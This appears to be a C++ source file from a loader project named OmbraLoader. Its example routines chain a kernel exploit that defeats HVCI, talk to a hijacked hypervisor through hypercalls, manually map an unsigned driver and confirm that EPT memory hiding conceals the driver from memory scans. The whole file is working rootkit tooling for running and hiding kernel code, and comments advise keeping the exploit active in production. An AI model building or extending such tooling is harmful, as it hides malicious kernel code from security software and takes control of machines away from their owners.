// Phase 3.3: EPT Hiding Verification Example
// Demonstrates verification that EPT-based memory hiding is working
// Run after: Phase 1 (exploit), Phase 2 (hijack), Phase 3.1 (hypercall), Phase 3.2 (driver mapping)

#include "zerohvci.h"
#include "hypercall_verify.h"
#include "driver_mapper.h"
#include "ept_verify.h"
#include <Windows.h>
#include <cstdio>

namespace OmbraLoader {

// Example 1: Basic EPT verification after driver mapping
int BasicEptVerification()
{
    printf("\n========================================\n");
    printf("  EPT Hiding Verification Example\n");
    printf("========================================\n\n");

    // Step 1: Initialize exploit (required for kernel R/W)
    printf("[STEP 1] Initializing exploit chain...\n");
    if (!zerohvci::Initialize()) {
        printf("[-] Exploit initialization failed\n");
        return -1;
    }
    printf("[+] Exploit initialized\n");

    // Step 2: Verify hypervisor and get session key
    printf("\n[STEP 2] Verifying hypervisor...\n");
    uint64_t session_key = zerohvci::hypercall::VerifyHypervisorActive();
    if (session_key == 0) {
        printf("[-] Hypervisor not active\n");
        zerohvci::Cleanup();
        return -2;
    }
    printf("[+] Session key: 0x%016llX\n", session_key);

    // Step 3: Map driver (Phase 3.2 should have already done this)
    printf("\n[STEP 3] Mapping driver...\n");
    uint64_t driverBase = zerohvci::mapper::MapDriver("OmbraDriver.sys");
    if (driverBase == 0) {
        printf("[-] Driver mapping failed\n");
        zerohvci::Cleanup();
        return -3;
    }
    printf("[+] Driver mapped at: 0x%llX\n", driverBase);

    // Step 4: Verify EPT hiding
    printf("\n[STEP 4] Verifying EPT hiding...\n");
    uint64_t driverSize = 0x100000; // 1MB estimate, actual from PE header
    zerohvci::ept::EptVerificationResult result =
        zerohvci::ept::VerifyEptHiding(session_key, driverBase, driverSize);

    // Step 5: Interpret results
    printf("\n[STEP 5] Results:\n");
    if (result.eptHidingConfirmed) {
        printf("[+] EPT HIDING CONFIRMED!\n");
        printf("    Memory scans will see garbage, execution works normally\n");
    } else {
        printf("[!] EPT hiding NOT confirmed\n");
        printf("    This might be expected if EPT handler not yet installed\n");
        printf("    Check that driver called EPT::HideDriver() in DriverEntry\n");
    }

    // Cleanup
    zerohvci::Cleanup();
    return result.eptHidingConfirmed ? 0 : 1;
}

// Example 2: Test storage slot operations for driver<->hypervisor communication
int StorageSlotTest()
{
    printf("\n========================================\n");
    printf("  Storage Slot Operations Test\n");
    printf("========================================\n\n");

    if (!zerohvci::Initialize()) {
        printf("[-] Exploit init failed\n");
        return -1;
    }

    uint64_t session_key = zerohvci::hypercall::VerifyHypervisorActive();
    if (session_key == 0) {
        zerohvci::Cleanup();
        return -2;
    }

    // Test writing to various storage slots
    printf("[*] Testing storage slot operations...\n");

    // Slot 0: CALLBACK_ADDRESS (driver callback)
    uint64_t testCallback = 0xFFFFF80012345678;
    if (zerohvci::ept::RegisterDriverCallback(session_key, testCallback)) {
        printf("[+] CALLBACK_ADDRESS slot written\n");
    } else {
        printf("[-] CALLBACK_ADDRESS write failed\n");
    }

    // Slot for EPT handler
    uint64_t testEptHandler = 0xFFFFF80087654321;
    if (zerohvci::ept::SetEptHandler(session_key, testEptHandler)) {
        printf("[+] EPT_HANDLER_ADDRESS slot written\n");
    } else {
        printf("[-] EPT_HANDLER_ADDRESS write failed\n");
    }

    // Read back and verify
    uint64_t readBack = 0;
    if (zerohvci::ept::GetStorageSlot(session_key, CALLBACK_ADDRESS, &readBack)) {
        printf("[+] Read back CALLBACK_ADDRESS: 0x%llX\n", readBack);
        if (readBack == testCallback) {
            printf("[+] Value matches - storage working correctly\n");
        } else {
            printf("[!] Value mismatch - got 0x%llX, expected 0x%llX\n", readBack, testCallback);
        }
    } else {
        printf("[-] Could not read back storage slot\n");
    }

    zerohvci::Cleanup();
    return 0;
}

// Example 3: EPT enable/disable test (use with caution!)
int EptToggleTest()
{
    printf("\n========================================\n");
    printf("  EPT Enable/Disable Test\n");
    printf("  WARNING: This can crash the system!\n");
    printf("========================================\n\n");

    if (!zerohvci::Initialize()) {
        return -1;
    }

    uint64_t session_key = zerohvci::hypercall::VerifyHypervisorActive();
    if (session_key == 0) {
        zerohvci::Cleanup();
        return -2;
    }

    // Query current EPT state
    uint64_t eptBase = zerohvci::ept::GetEptBase(session_key);
    printf("[*] Current EPT base: 0x%llX\n", eptBase);

    // DO NOT actually disable EPT in production - system will crash
    // This is just to show the API exists
    printf("[!] NOT disabling EPT (would crash system)\n");
    printf("[!] Use zerohvci::ept::DisableEpt() only in test VMs\n");

    /*
    // Dangerous - only in test VM:
    if (zerohvci::ept::DisableEpt(session_key)) {
        printf("[+] EPT disabled\n");

        // Re-enable immediately
        if (zerohvci::ept::EnableEpt(session_key)) {
            printf("[+] EPT re-enabled\n");
        }
    }
    */

    zerohvci::Cleanup();
    return 0;
}

// Example 4: Complete integration with OmbraLoader main flow
int FullIntegrationExample()
{
    printf("\n========================================\n");
    printf("  Full OmbraLoader Integration Flow\n");
    printf("========================================\n\n");

    // Phase 1: Check if bootkit already installed
    // (In real code, check for hypervisor via CPUID magic leaf)
    printf("[PHASE 1] Checking system state...\n");

    // Phase 2: Initialize exploit chain
    printf("\n[PHASE 2] Initializing ZeroHVCI...\n");
    if (!zerohvci::Initialize()) {
        printf("[-] Exploit failed - system may be patched\n");
        return -1;
    }
    printf("[+] Kernel R/W obtained\n");

    // Phase 3: Verify hypercalls
    printf("\n[PHASE 3.1] Verifying hypercalls...\n");
    uint64_t session_key = zerohvci::hypercall::VerifyHypervisorActive();
    if (session_key == 0) {
        printf("[-] Hypercalls not working - is hypervisor active?\n");
        zerohvci::Cleanup();
        return -2;
    }

    // Phase 4: Map driver
    printf("\n[PHASE 3.2] Mapping OmbraDriver...\n");
    uint64_t driverBase = zerohvci::mapper::MapDriver("OmbraDriver.sys");
    if (driverBase == 0) {
        printf("[-] Driver mapping failed\n");
        zerohvci::Cleanup();
        return -3;
    }

    // Phase 5: Register driver callback with hypervisor
    printf("\n[PHASE 3.3a] Registering driver callback...\n");
    // The callback is typically DriverEntry or a dedicated handler
    // Offset depends on driver PE layout
    uint64_t callbackOffset = 0x1000; // Example - actual from PE export
    if (!zerohvci::ept::RegisterDriverCallback(session_key, driverBase + callbackOffset)) {
        printf("[!] Could not register callback (may be OK)\n");
    } else {
        printf("[+] Callback registered\n");
    }

    // Phase 6: Verify EPT hiding
    printf("\n[PHASE 3.3b] Verifying EPT hiding...\n");
    zerohvci::ept::EptVerificationResult eptResult =
        zerohvci::ept::VerifyEptHiding(session_key, driverBase, 0x100000);

    // Summary
    printf("\n========================================\n");
    printf("  INTEGRATION COMPLETE\n");
    printf("========================================\n");
    printf("Driver Base: 0x%llX\n", driverBase);
    printf("Session Key: 0x%llX\n", session_key);
    printf("EPT Hidden:  %s\n", eptResult.eptHidingConfirmed ? "YES" : "NO");

    if (!eptResult.eptHidingConfirmed) {
        printf("\nNOTE: EPT hiding not confirmed. This is expected if:\n");
        printf("  1. Driver hasn't called EPT::HideDriver() yet\n");
        printf("  2. EPT handler not installed\n");
        printf("  3. Running on AMD (uses NPT instead of EPT)\n");
    }

    // Keep session alive for client operations
    printf("\nLoader complete. Driver is active.\n");
    printf("Use libombra API for hypervisor operations.\n");

    // In production, don't cleanup - keep exploit active for session
    // zerohvci::Cleanup();

    return 0;
}

} // namespace OmbraLoader

/*
// Uncomment to build as standalone test
int main()
{
    int result = OmbraLoader::BasicEptVerification();
    // int result = OmbraLoader::StorageSlotTest();
    // int result = OmbraLoader::EptToggleTest();
    // int result = OmbraLoader::FullIntegrationExample();

    printf("\nPress Enter to exit...\n");
    getchar();

    return result;
}
*/
